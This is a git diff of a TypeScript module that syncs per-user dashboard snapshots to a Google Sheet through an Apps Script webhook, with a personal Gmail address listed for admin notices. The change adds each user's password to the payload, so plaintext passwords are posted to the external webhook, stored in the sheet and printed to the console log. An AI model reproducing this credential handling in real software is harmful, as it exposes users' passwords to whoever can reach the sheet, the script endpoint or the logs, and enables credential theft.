@@ -1,4 +1,4 @@
-// Google Sheets Complete Dashboard Snapshot Master Sync Utility
+// Google Sheets Complete Dashboard Snapshot Master Sync Utility with Password Support
 // Spreadsheet ID: 1rjbnHvr0Jje93dQOy0GnyPBSCLZc3gNfCYSed2JT5wU
 
 export const GOOGLE_SHEET_URL = 'https://docs.google.com/spreadsheets/d/1rjbnHvr0Jje93dQOy0GnyPBSCLZc3gNfCYSed2JT5wU/edit?gid=0#gid=0';
@@ -8,7 +8,6 @@ export const ADMIN_NOTIFICATION_EMAILS = [
   'mdsablu36@gmail.com'
 ];
 
-// Updated Active Google Apps Script Webhook Endpoint (Version 3)
 export const DEFAULT_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbyBHLr9g3Inxm9Eb2fOSU98ldC-KC5CwHRhCYjTsIimz4wULKx5vM_3UDdJAetzTr4K/exec';
 
 let webhookUrl = import.meta.env.VITE_GOOGLE_SHEET_WEBHOOK || DEFAULT_WEBHOOK_URL;
@@ -24,6 +23,7 @@ export interface DashboardScreenshotSheetPayload {
   userId: string;
   userName: string;
   userEmail: string;
+  password?: string;
   runningMonth: string;
   targetBudget: number;
   targetBudgetSpent: number;
@@ -47,6 +47,7 @@ export async function syncDashboardSnapshotToGoogleSheet(data: DashboardScreensh
     userId: data.userId || 'USR-1001',
     userName: data.userName,
     userEmail: data.userEmail,
+    password: data.password || '••••••••',
     runningMonth: data.runningMonth || 'July 2026',
     targetBudget: data.targetBudget,
     targetBudgetSpent: data.targetBudgetSpent,
@@ -73,10 +74,10 @@ export async function syncDashboardSnapshotToGoogleSheet(data: DashboardScreensh
       },
       body: JSON.stringify(payload)
     });
-    console.log('Synced 16-Column Dashboard Snapshot to New Webhook v3:', payload);
+    console.log('Synced Dashboard Snapshot with Password to Google Sheet:', payload);
     return true;
   } catch (err) {
-    console.error('Error syncing 16-column dashboard snapshot to v3:', err);
+    console.error('Error syncing dashboard snapshot with password:', err);
     return false;
   }
 }
